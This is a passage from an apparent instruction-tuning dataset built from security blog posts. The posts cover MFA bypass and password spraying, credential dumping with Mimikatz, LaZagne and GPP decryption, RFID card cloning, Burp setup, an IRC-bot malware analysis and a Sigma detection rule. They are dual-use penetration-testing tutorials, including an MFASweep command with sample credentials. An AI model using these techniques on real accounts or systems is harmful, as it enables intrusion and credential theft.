authenticating to this API with the sprayed user's credentials and sure enough I was authenticated and bypassed the need for the user's MFA The Graph API allows for reading the Azure Active Directory user list What this enabled me to do was extract the full username list for the organization where I had previously only had a partial list built during reconnaissance I took the full list which has thousands more users than I previously had and started password spraying again With the full user list I ended up spraying many more accounts In testing out authentication for these accounts I found that some had not yet enrolled in the MFA product used by the company So I enrolled for them This now allowed me to authenticate to the Outlook portal with a web browser In addition to being able to read their email I could also view what they had permission to read on SharePoint Their SharePoint site provided details on what was needed to VPN into the network including the client certificate on a virtual machine and successfully connected over SPN to their network Inconsistencies in MFA deployments is one of the bigger trends I have seen when it comes to cloud-based misconfigurations Conditional access policies allow organizations to enable fine-grained controls over how users authenticate These can range from the location a user is authenticating from the device they are using and also if they are trying to access legacy portals Because of theses inconsistencies I wrote a tool to check for potential single-factor access on Microsoft services that I call MFASweep ithub.com dafthack MFASweep Once you compromise a set of credentials checking for MFA inconsistencies can be done by importing the MFASweep PowerShell script and running the following command substituting the credentials Invoke-MFASweep -Username targetuser targetdomain.com -Password Winter2022 There is a big difference between utilizing the cloud for productivity tools vs infrastructure Services like Microsoft 365 or Google Workspace enable employees to be productive with things like email shared drives chat and document editing tools While these are technically cloud-hosted services they are separate from the infrastructure side where virtual machines databases web applications serverless technologies and more can be spun up In fact they have separate APIs in most cases for communicating with them More organizations are using cloud services for infrastructure instead of hosting systems in their own datacenters As a penetration tester or red teamer assessing this infrastructure you much look at these resources from a different angle What do you do after you get access to an Amazon AWS access key ID and secret access key If you compromise a Microsoft Azure user who has a subscription what can you access How do you pivot in the cloud These are some of the questions that over the last few years I have needed to answer out of necessity due to facing them head-on I have collected what I have learned into a training course that I call Breaching the Cloud This course services as my own personal methodology that I reference when performing assessments involving any aspect of the cloud In my opinion we are just scratching the surface of organizations leveraging cloud resources In addition to the rapid deployment of critical business infrastructure to the cloud these services themselves are evolving daily Organizations are still learning new ways to configure access security protections and alerting These along with completely new services being established altogether will create a high potential for security issues to arise in the future"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Monitoring High Risk Azure Logins</title>\n<taxonomies>Blue Team, David Perez, Incident Response, Informational, Azure, Entra ID, SIEM, SOC</taxonomies>\n<creation_date>Thu, 12 Sep 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Recently in the SOC we were notified by a partner that they had a potential business email compromise or BEC We commonly catch these by identifying suspicious email forwarding rules utilizing anomaly detection services or by reports from our partners as we did in this scenario As always the earlier we can catch these events in the attack chain the better This led us to begin investigating high risk logins identified by Azure AD Identity Protection or what is now known as Entra Identity Protection Entra ID protection categorizes risk levels as low medium or high Entra ID also attaches the atRisk label if a potential threat actor has gained access to a user's account Determination of risk level is based on the confidence in the signals by Entra ID and utilizes Real-time and Offline detection techniques to assess these values Organizations not utilizing an Azure AD P2 license will have limited detection capabilities using this service Investigating these events is straight-forward once you understand what information Entra ID is using to make these detections The most useful attributes being IP address operating system ASN and country of origin Once an atRisk login has been identified I start my investigation by querying the related user account and comparing the surrounding log's login information to see what normal activity looks like for the user The detections most closely correlated with multi-factor authentication events were the most useful Logically speaking if an MFA request has been sent to a device then the user account's password has very likely been compromised I've included this as part of the sigma rule at the bottom of the blog The most common false positives I have seen so far are from users signing in from mobile devices or from different IP addresses due to them being on travel True positives seem to stick out like a sore thumb whereas a user is most often seen signing in from a Windows machine and then suddenly they are seen using a Mac in a different country Azure atRisk Sign-in Events In summary monitoring these alerts more closely has helped us to catch more of these events earlier in the attack chain I hope this helps you as well Sigma Rule title High Risk Azure Login Requiring MFAstatus testeddescription This detection leverages Azure AD's built-in service Azure AD Identity protection to detect anomalous high risk sign ins to cloud accounts requiring MFA approval This is an indication that a user's password has been compromised.references author David Perezdate 2024 07 16tags attack.t1528 attack.credential_accesslogsource product azure service signinlogsdetection selection risk_state 'atRisk'authentication_requirement 'multiFactorAuthentication'risk1 risk_level_aggregated 'High'risk2 risk_level_during_signin 'High condition selection and 1 of risk falsepositives Users known to be on travel most common Users authenticating with new devices in their possession i.e mobile device Entra Risk Detections The time difference between a suspicious sign-in event versus a detection in logs reports can range significantly for real-time detections it is 5-10 minutes and up to 48 hours for offline detections Risk detection Detection type Type riskEventType Sign-in risk detections Activity from anonymous IP address Offline Premium riskyIPAddress Additional risk detected sign-in Real-time or Offline Nonpremium generic Premium detection classification for non-P2 tenants Admin confirmed user compromised Offline Nonpremium adminConfirmedUserCompromised Anomalous Token Real-time or Offline Premium anomalousToken Anonymous IP address Real-time Nonpremium anonymizedIPAddress Atypical travel Offline Premium unlikelyTravel Impossible travel Offline Premium mcasImpossibleTravel Malicious IP address Offline Premium maliciousIPAddress Mass Access to Sensitive Files Offline Premium mcasFinSuspiciousFileAccess Microsoft Entra threat intelligence sign-in Real-time or Offline Nonpremium investigationsThreatIntelligence New country Offline Premium newCountry Password spray Offline Premium passwordSpray Suspicious browser Offline Premium suspiciousBrowser Suspicious inbox forwarding Offline Premium suspiciousInboxForwarding Suspicious inbox manipulation rules Offline Premium mcasSuspiciousInboxManipulationRules Token issuer anomaly Offline Premium tokenIssuerAnomaly Unfamiliar sign-in properties Real-time Premium unfamiliarFeatures Verified threat actor IP Real-time Premium nationStateIP User risk detections Additional risk detected user Real-time or Offline Nonpremium generic Premium detection classification for non-P2 tenants Anomalous user activity Offline Premium anomalousUserActivity Attacker in the Middle Offline Premium attackerinTheMiddle Leaked credentials Offline Nonpremium leakedCredentials Microsoft Entra threat intelligence user Real-time or Offline Nonpremium investigationsThreatIntelligence Possible attempt to access Primary Refresh Token PRT Offline Premium attemptedPrtAccess Suspicious API Traffic Offline Premium suspiciousAPITraffic Suspicious sending patterns Offline Premium suspiciousSendingPatterns User reported suspicious activity Offline Premium userReportedSuspiciousActivity Entra Risk Detection Event Types Resources earn.microsoft.com en-us entra id-protection howto-identity-protection-investigate-risk earn.microsoft.com en-us entra id-protection concept-identity-protection-risks earn.microsoft.com en-us entra id-protection overview-identity-protection license-requirements"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Pentesting ASP.NET Cookieless Sessions with Burp</title>\n<taxonomies>Red Team, Web App, Asp .Net cookliness session, Burp, Pentesting</taxonomies>\n<creation_date>Mon, 04 Jan 2016 22:00:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Brian King We were recently testing a web application that used ASP.NET cookieless sessions This meant that the session token was part of the URL as shown in the example below ww.blackhillsinfosec.com S hd73kdjf780sndyfn23elomzqd5ghwa login.html In this case the session token is of the form S LongRandomToken where LongRandomToken is a long randomly generated alpha-numeric string and takes the place of the session cookie This implementation makes for a messy site map when testing with Burp Suite because the changing tokens make it appear that there are limitless content paths in the application For example a site map that has one login page would show up as several different paths because of the changing token values as shown below Messy Site Map Due to Multiple Tokens While we tested we wanted to have a clean site map that essentially ignored all of the token values and mapped them as if they weren't there In addition we wanted the Burp Suite spider and scanner tools to continue to work So we came up with the following hack read on The solution Use two instances of Burp Browser uses Burp1 as a proxy Burp1 uses Burp2 as a proxy Create a Match Replace rule in Burp1 to pull the problematic token out of the request URL and tack it onto the end of the URL as a URL parameter Create a Match Replace rule in Burp2 to grab the parameter off the end and put it back Use Burp1 when you want to see the nice site map Use Burp2 when you want to see the requests without tampering Burp1 listens on the default port of 8080 and we configured Burp2 to listen on port 8090 Burp2 Listens on Port 8090 Then we configured Burp1 to use Burp2 as an upstream proxy Now we have the web application connecting to Burp1 Burp1 connecting to Burp2 and Burp2 connecting to the ASP.NET Server we were testing Proxy Configuration Here are the match and replace rules needed Burp1 Match Replace Rule Match S Replace 1 3 ?zzzz 2 4 This yanks the token out of the URL path and tacks it onto the end of the URL as the zzzz parameter Don't worry about whether there were already URL parameters and you just added another question mark we will undo this in the Burp2 proxy before sending to the web server Burp2 Match Replace Rule Match w ?zzzz Replace 1 3 2 4 This works and makes a clean site map but This only affects things that pass through the Burp proxy If you're using the spider the scanner or other tools those rules don't apply For this second problem we'll use Burp's macros and its session tools If the parameter had a name the macros are all we'd need But because it shows up as a bare value with no name we're going to need that upstream instance of Burp again Go to Options Sessions and scroll down to the Macros section to add one You can pull requests from your proxy history or you can send those requests now and capture them as you go You want the set of requests necessary to create a new session the login steps For each URL that you need configure the item so that Burp sends the correct inputs e.g username password and notices the right things in the responses Usually you want it to update the cookie jar and that's enough Here though there's no session cookie and the thing we want doesn't even have a name We configured the first item so that it would send a request with no token in it which causes the server to return HTTP 302 to a URL that does have the token We configured Burp to extract the token from the HTTP 302 response Because the actual token has no name we made up a new name that wasn't already used anywhere Next we manually added that parameter to the second request in the query string just typed aaaa asdf at the end of the GET string Then we needed to configure that second URL so that it would replace our 'asdf with whatever was found in the response to the first request Click the Test Macro button to make sure that Burp is extracting the right value and putting it in the right place Look for the Derived parameters in the second item In our test there was no way to avoid it being URL-encoded That's OK here because we're going to change it in the upstream proxy anyhow It would have been cleaner if we'd captured only the part between the inner parenthesis In the upstream proxy configure a Match and Replace rule to rewrite that URL into the form the application is expecting That rule turns something like this GET S 3gmt4o45krcb0bfbzvh2ud55 Pages default.aspx?locId 1 aaaa 28S 28awtsga551hn1bb550xmy2n2i 29 29 HTTP 1.1 Into something like this S awtsga551hn1bb550xmy2n2i Pages default.aspx?locId 1 HTTP 1.1 There's a problem with this though it's short-lived There is no actual parameter called aaaa anywhere in this application much less right here where we need it If this were a normal named parameter we wouldn't need to make up a temporary parameter name and wouldn't need that upstream proxy to rewrite the URL This also results in a bit of extra traffic when it's used and it can pollute the sitemap a bit But for a targeted scan of one function at a time it sure beats having to re-explore the site and run the scan all on one unbroken session"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>InfoSec Basics & Fundamentals</title>\n<taxonomies>Author, InfoSec 101, John Strand</taxonomies>\n<creation_date>Wed, 06 Jan 2016 22:08:55 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand One of the more difficult aspects of getting started in any new field is knowing where to begin When I got started in this field in 2000 there was very little in the way of getting started We had some weird websites and lots of posturing and belittlement That and we had a lot of odd folks asking you to Cyber So yea It pretty much blew We also hear this industry is going to grow by 200-400 over the next few years That is a lot of new people coming in And for all that is holy and right in the world we need more videos which do not feature cats or hippos farting Not that there is anything wrong with that It just has nothing to do with IT security Pictured Noting to do with this article So to that end I have a few videos for everyone The first one is an intro to Linux video Intro to Linux from SANS Institute on Vimeo It goes through the basics and fundamentals of how to approach the command line on a Linux system Is it comprehensive Nope Is it enough to get you started Absolutely Next is a video on TCP IP embed outu.be -FPnGj3m6sQ embed This video will get you a rough idea of what is going on with the TCP IP header to drive packets around the internet Finally the last video is getting started with tcpdump This is one of the more important sniffers out there today Sure Wireshark is cool but tcpdump is fast and very flexible Check it out here embed outu.be NsaMXr72cqo embed"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>RFID Replaying with the Proxmarx3</title>\n<taxonomies>Physical, Red Team, hacking RFID, RFID</taxonomies>\n<creation_date>Wed, 13 Jan 2016 22:10:01 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Rick Wisser Ohhh Who Says Tree's are not Interesting RFID's Radio-Frequency Identification have been around for a while now and are utilized for Inventory tracking control retail clothing animal tracking and door access control among other uses Most of these RFID tags are known as passive meaning that they don't require power and utilize a magnetic field to be active This allows them to essentially turn on when an electromagnetic field is near them When this happens the tag unlocks and transmits a fixed code within the chip RFID's can be made into almost any shape and size The most interesting uses of RFID are related to security such as door access control devices These usually serve as a name badge as well as a key to grant access to specific doors throughout a facility Access can be granted based on the work functions of the employee For example an IT professional will need access to the server room but not necessarily the secretary Physical penetration testers are always interested in getting a hold of one of these cards especially if they can just clone a key card This leads us to a Proxmarx3 device At BHIS we find ourselves hired to do a physical assessment from time to time To help in doing these assessments we recently acquired a Proxmarx3 RFID device that can be utilized to clone or replay an RFID door access card To see how well the Proxmarx3 functions and get familiar with the device I decided to do some testing I have an RFID card that I use to access my local Recreation Center that I used as the test I did get authorization from the Recreation Center Director before conducting the test I first had to update the Proxmarx3 firmware before I could utilize it since the firmware on the device was outdated I will not go over this portion are several resources on the Internet for flashing and updating the Proxmarx3 Assuming that the device has already been updated let's show the functionality of the Proxmarx3 ww.youtube.com watch?v hZs8JsdMAr4 A step-by-step process of the video above Plug the USB of the Proxmarx3 into a portable USB battery note that when plugging it in you will see the lights flash on the Proxmarx3 indicating that it has power Hold the button on the Proxmarx3 down for about 3 seconds until the lights start to flash then release The end result should leave the Proxmarx3 setting with a solid red light Press and hold the button again until the other red light comes on This now indicates that the Proxmarx3 is ready for a card to be scanned and read into storage of the device Pass the RFID tagged device that you want to copy over the antennae until the red light that came on in step 3 goes out This indicates that the RFID tag information was read into the Proxmarx3 memory Hold the button down again for about 1 second a green light should come on This indicates that the Proxmarx3 is now replaying the captured RFID tag To continue with the testing it was now time to see if the replay portion of the Proxmarx3 was real After having the key cards information captured cloned into the Proxmarx3 I headed to the Recreation Center for some testing ww.youtube.com watch?v FtGNf1fpHps I accessed the door several times and the Director of the Recreation Center monitored the system to see if it logged my card as being read by the system He did verify that it was in fact my card being logged on the system when utilizing the Proxmarx3 It is nice to see how the Proxmarx3 works but what about protecting your cards from being cloned Hence the aluminum wallet myth I am sure you have all heard of it or seen advertisements for it In Theory if your cards are in an aluminum wallet they will be protected from being scanned and or cloned I decided to pick one of these up at the local dollar store to give it a try After several attempts it seems that the aluminum does block or interfere with the electromagnetic field enough to hinder cards contained within it from being accessed with the Proxmarx3 But wait what about tin foil I have a couple paranoid friends who we will just say are frugal and believe that tin foil will do the same thing So out of curiosity I attempted to copy the RFID tag wrapped in tin foil The results were conclusive and the attempt was unsuccessful Below is a Video attempting to read the RFID card with these protections in place ww.youtube.com watch?v OdJ5fXVQBVM In conclusion it looks like the Proxmarx3 is a tool that should be included in your physical pen testing jump bag Keep in mind that this is just a high level approach to the functionality of the device More information can be found with a simple search of the internet"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Your Password Is... wait for it... NOT Always Encrypted</title>\n<taxonomies>External/Internal, Red Team, encryption, mimikatz, passwords</taxonomies>\n<creation_date>Fri, 15 Jan 2016 22:16:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven As pentesters we LOVE passwords they come in all shapes and sizes A good password has 16 characters and a mix of case digits and special characters so that a computer would require many years to brute force it Even though these passwords may be difficult to crack it turns out that they are readily accessible and unencrypted when you know where to look Using a password to login to a system may not seem like the sexiest of hacks but we can provide great value to the customer by demonstrating to an organization just how easy it is to find and use passwords to do some serious damage in a pentest Below is a brief description of some of the quick and easy ways that we harvest passwords to use during a penetration test including screenshots so you can try this too And remember that many users reuse their passwords so these harvested passwords may unlock other accounts as well Oh and if you really want to spoil our fun implement two-factor authentication It is one of the only ways to defeat or at least slow down this type of attack Mimikatz Get it here Passwords must be stored in memory RAM on a computer so that the operating system is able to validate the password entered by a user Since information stored in RAM looks something like this it is not straightforward to find which chunks of 1s and 0s represent a password Thankfully some smart people have figured it out for us and created tools to extract passwords from this huge blob of data One of those tools is Mimikatz created by Benjamin Delpy It can be executed on a live Windows system against an offline memory dump or downloaded from a remote site and executed in memory only very stealthy Or as is often the case in pentests it can be executed via the ever popular Metasploit Meterpreter First we'll show you how to do this using a Meterpreter session setup between an external machine and an internal target The Meterpreter command Mimikatz will extract and display the cleartext Windows passwords currently resident in the memory of the target machine This may even include cached domain passwords Set up a listener that the target machine can connect back to Connect back to the listener Establish a meterpreter session Find the process ID of a process running as SYSTEM Migrate into the SYSTEM process Now with the privileges of SYSTEM we can ask Meterpreter to read from memory using two simple commands load Mimikatz and wdigest and it will dutifully return all the passwords it can find in memory Execute Mimikatz Using a standalone machine for this test with a dummy account we only see one account credential but a domain connected machine may yield others Mimikatz can also be used against a memory dump or more specifically a memory dump of the process that manages access to a Windows system lsass.exe On a Windows Vista and later system you can use the built-in Task Manager to dump the process memory On earlier systems you can use the tool procdump from Sysinternals You do need administrator privilege for this operation because it reads from memory making this method a bit less useful during a pentest but still a handy trick to know On newer versions of Windows use Task Manager to dump RAM Note where the file is saved On older Windows systems use procdump to dump RAM Then run Mimikatz and from its interface you again have just two simple commands to pull the passwords from the memory dump Load Mimikatz Point Mimikatz at the dump file and ask for the passwords Next let's run Mimikatz right on the Windows workstation to extract the passwords that currently reside in memory For this test we are running a Windows 7 fully patched machine that is not joined to a domain First download the executable from here If you have A V running it will probably get upset about this download so you will have to allow whitelist it Then just run Mimikatz from the command line and give a couple of commands as shown below Execute Mimikatz to extract passwords from a live system as opposed to a memory dump Lastly let's use a single PowerShell command to download Mimikatz and run it in memory only no file saved on disk and dump the memory resident passwords The PowerShell script used for this was created by Joseph Bialek and can be found here To run this you will need to open an Administrator command prompt right-click on cmd.exe and Run as Administrator Then issue the command that fetches the PowerShell script from a web server and executes it as shown below Run a simple web server to serve up the PowerShell script Start up PowerShell download and then invoke the Invoke-Mimikatz script Lazagne Get it here Lazagne is a relatively new tool written by Alessandro Zanni that can dump many different passwords found on Windows and Linux Unix machines It is able to extract passwords from web applications that have been saved in browsers as well as mail clients Wi-Fi configurations databases chat clients and more If run with Administrator privilege it can also dump Windows password hashes which can then be cracked or used in pass-the-hash type attacks Just run the executable as Administrator for better results to extract passwords Windows Credential Editor WCE Get it here WCE is an older but still functional tool designed for system administrators to make password management a bit easier But of course attackers and pentesters can use this tool too It must be run with Administrator privilege again not ideal in a pentest but sometimes still possible Windows Credential Editor dumps passwords from memory Group Policy Preferences GPP Up until fairly recently May 2014 to be exact there was a feature in Windows called Group Policy Preferences that allowed system administrators to create and manage local administrator accounts on the system under their charge This is handy for busy admins because it allows password changes to be done remotely and in bulk GPP stored configuration items like the local Administrator account passwords in a file on disk and the actual passwords were encrypted with good strong AES encryption The decryption key for the password was the same for all Windows installations and was accessible to anyone on the Microsoft website This means that anyone with access to the GPP file could grab the key from Microsoft and decrypt the passwords contained in the file Easy-peasy Microsoft patched this in 2014 by removing the option to include password management via the GPP mechanism however any old GPP files that existed prior to the patch that were not removed may still contain valid administrator passwords We regularly find such files during pentests and surprisingly the passwords are often still valid You can obtain these passwords by finding the files where they are stored and then passing the encrypted strings to the Ruby script gpp-decrypt There is also a Metasploit post-exploitation module gpp that will harvest and decrypt in one step Both methods are demonstrated in the screenshots below Note that read access to these GPP XML files does NOT require elevated privileges Command to find files containing encrypted Administrator passwords Decrypt the passwords with a Ruby script found here Metasploit's GPP module will harvest and decrypt the passwords.Hint Once you know the local Admin credentials use the Metasploit module smb_login to find out where else on the domain you might be able to use the account.Other ideas for easy winsHere are a few other tips that you just might get lucky with Users and computers store passwords in some interesting places Search public data breaches for your domain to find passwords or hashes that have been posted Look for password files stored on users desktops Check the contents of a user's clipboard it might just contain the last cut paste password If you have other ideas for extracting cleartext passwords we would love to hear about them Send an email to sally at blackhillsinfosec dot com Thanks References etasploit.com modules post windows gather credentials gpp ithub.com PowerShellMafia PowerSploit blob master Exfiltration Get-GPPPassword.ps1 ww.ampliasecurity.com research windows-credentials-editor www.metasploit.com ithub.com gentilkiwi releases tag 2.0.0-alpha-20160112 ithub.com clymb3r PowerShell tree master Invoke-Mimikatz ownload.sysinternals.com files Procdump.zip ithub.com AlessandroZ LaZagne"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Pentesting with Linked Clones</title>\n<taxonomies>Author, Brian King, How-To, InfoSec 101, linked clones, Pentesting, virtual machine, VM</taxonomies>\n<creation_date>Tue, 19 Jan 2016 22:33:14 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian B King If working with several customers at once or in succession it would be easy to lose track of whose data you're looking at or to include one customer's information in another's report That would be bad Using a separate virtual machine for each customer can help you avoid those mistakes but virtual machines can get pretty big and can take a long time to create Having one per client wastes a lot of time and space That's not as bad as the other thing but it's not good either Enter Linked Clones With Linked Clones you can create a new VM very quickly and they use much less disk space You don't have do anything unusual before you set up a linked clone so if you've got a VM you like you can start with that If you want to be extra cautious you might want to start with a clean one that has no customer data on it at all since that's what we're trying to isolate here I use a separate VM exclusively for writing reports so I also create a temporary folder on my host for each test I map that folder as a shared drive in my testing VM and in my reporting VM I use that folder to store my screenshots notes and other artifacts as I test This way I still have quick access to all of that when I'm writing the report but I minimize the risk of keeping sensitive information around Once I'm done with the test I can securely archive anything I may need to keep then destroy the clone and the temporary shared folder When I start the next test I can create a fresh clone and know that no customer information will accidentally carry over In this article I'm walking through the steps for VirtualBox but the concept also works with VMWare products and others so check the manual for whatever you're using Create the Base First create a VM with your base operating system and all the tools you need Install all of the updates and patches available because your clone will inherit them Create the Clone First right-click on the VM in VirtualBox Manager and choose Clone or hit CMD-O Make a new clone Give the new clone a useful name If you're doing an in-depth test where you'll have a lot of data stored you might want to name it after the specific customer and use it only for that If you're doing less intrusive work maybe you'll be comfortable naming it after the current month and using it for more than one customer Remember what your goals are and work towards those Check Reinitialize the MAC address of all network cards to avoid trouble if you ever end up running more than one of these at a time In the next step choose Linked clone as the Clone type click Clone and in a few seconds your linked clone will be ready Benefits Time On my average-powered system it takes just a few seconds to create a Linked Clone and a few minutes to create a Full Clone Creating a new VM from scratch can eat up the better part of a day once you account for installing OS updates and tools Space The Linked Clones share resources with the Base so each one is significantly smaller than it would otherwise be Isolation Linked Clones allow you to have an isolated test environment for each customer or time period which minimizes the risk of accidental information disclosure Notes and Tips Use a different desktop wallpaper or general windowing system appearance so you can quickly tell which VM you're in Updates to the Linked Base do not propagate to the Linked Clones after they've been created Get your Linked Base up to date before creating a new clone Any time you find a new or updated tool set it up on the Linked Base so that future clones will inherit it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Why The Hate for Threat Intelligence Feeds?</title>\n<taxonomies>Author, InfoSec 101, John Strand</taxonomies>\n<creation_date>Tue, 26 Jan 2016 22:37:46 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand Recently on an episode of Security Weekly I lost my mind on threat intelligence feeds I feel just a bit bad about it Adorable puppies make everything ok Right Apollo But I think I need to explain how I got to this point Through SANS and IANS I come into contact with a large number of companies way more than a normal person should About a year or so ago I was all on the threat intelligence feed TIF bandwagon The idea of sharing information with each other is awesome and powerful However something went very wrong with TIFs Basically it boils down to this They don't work I know there are going to be people who want to fight me in the streets on this but it's true Nerd Fight They just do not work Remember I was a fanboy But over time I asked more and more of my classes who was using them and if they got value out of them The number of people who got value was less than 5 Further if you step back and think about it they were a dumb idea to begin with Blacklists are a dumb idea In many but not all ways TIF is another blacklist or at least a variation on the blacklist theme If you want to know more about how blacklisting and enumerating badness is dumb please read this ww.ranum.com security computer_security editorials dumb All a bad guy needs to do is not to be on the badness list Further at BHIS we are attacking organizations all the time The tactics and malware both change and stay constant What changes First the malware Malware from engagement to engagement is constantly in flux This is because we are in a race to outpace AV It is not a hard race but it does lead to our malware morphing a lot The second thing that changes is delivery Bypassing mail filters is very similar to bypassing AV You have to modify and adapt Finally our IP addresses for C2 phishing and attack change quite a bit Yes we see the same thing with bad guys as well But there are a whole slew of things which move and adapt far slower First pivoting When we pivot we tend to use the same tactics again and again SMB shares token impersonation pass the hash password spraying are all staples to what we do almost every day Further these tactics we use are pretty much the same the bad guys use So why do you need a threat feed to tell you how to detect that You can do it right now in your organization Go here inyurl.com 504extra2 Get the C2_Work spreadsheet and start going through the things listed in there This spreadsheet is a small subset of what we do in our C2 pivot tests This spreadsheet is a test before the test for our customers If you can detect it awesome If not you need to start looking at other security approaches Like these ww.youtube.com watch?v wlkILCd_S04 We can quantify that TIFs are crap For example in the Verizon Data Breach report they found 3 overlap in feeds 3 Further when it came to malware they found that 70 -90 of malware specimens were unique to the targeted organization I think Eric Conrad Co-author of SANS 511 said it right Two things malware wants to persist and it wants to phone home We can focus on those areas and also find lateral movement with tools like Microsoft Advanced Threat Analytics Now there are certain things that do have value and fall under the banner of threat intelligence which does work Working with partners in the same industry to share information NOT A VENDOR seems to work very well Developing your own internal threat intelligence team has tremendous value These things cannot be bought You have to work for them Intelligence cannot be purchased only learned I have had a number of people email and call to ask if I am Okay I am Okay Threat Intelligence feeds did not beat me when I was a child I just don't want to see any more organizations throw their money away Now John where on the doll did threat intelligence feeds hurt you"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hacking Like It's 1999</title>\n<taxonomies>Blue Team, How-To, Hunt Teaming, hacking, old scripts, old stuff</taxonomies>\n<creation_date>Thu, 28 Jan 2016 22:39:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman Last week a friend stopped by my desk with a worried look on his face He knelt down and showed me the screen of his laptop where there was a virtual terminal open After looking I asked what the system did he said it was just a GitLab server for a personal project I went ahead and killed the process that was still running then switched the executable bit off on the binaries under the directory referenced above Thinking it might be something interesting I showed Derek who was visiting at the office We helped our friend back up his data from the server and asked if we could have a copy of the software that was dropped on the there you know for science Happy to have had a hand with getting his data off the server our nameless friend agreed to let us have a look and write about what we'd found We could see where the attackers had pulled their toolkit from and wanting an original copy of the binaries we went ahead and pulled them down through an anonymizing proxy to a clean Kali instance As a programmer I was interested in the tools From the above I could see an order of behaviors so I started with the contents of x.tgz The first thing I wanted to look at was that start script in x.tgz It turned out to be a bash shell script Walking through the script step by step we see that it starts with an error check to see if it was invoked with the correct number of arguments If not it prints a help message in Romanian Tasteaza start canal or Type start channel Moving on we get a call to ifconfig which parses out the local link addresses and sets a variable to count them A banner is printed a quick Google search on the banner brings up an interesting blog post about how nothing has changed in ten years written in 2013 So I guess nothing has changed still Back to the file We launch something for each of the link addresses we found That's the inst file Let's have a look As we had expected this file is setting up bots The top of the file is full of denominations the last 52 lines contain the logic that pulls the arguments and denominations to configure the bots We can see what the argument ronnie was for it sets up Ronnie as the channel name Back in start we get a final few calls One of them completes the install the next is to set up the autorun for updates and finally run the malware These were pretty basic The attacker added some iptables rules created a user named bin and gave the user root privileges Finally an email is sent to a Gmail address hardcoded into the rinst.e file it seems to be mailing out a count of interfaces and a hostname The next step our attacker took was to download and run some scripts from a file called ryo We had also obtained that file Again it's a series of scripts these simply set up psyBNC which is along the lines of cloaking an IRC connection The documentation for the project is from 2003 and development was stopped in 2009 Looking through the rest of the launch we see the run file launching an executable called proc the GCC version is 2.9 and the OS is RedHat 7.1 So very old The attack was rounded out with something called Pydrona These executables appear to be the most recently compiled gcc 4.3.4 One is related to another executable which our attacker had previously deleted Xhide The software is meant to hide a process The other claims to be Drona Turbata 3.0 Python version Which translates to angry 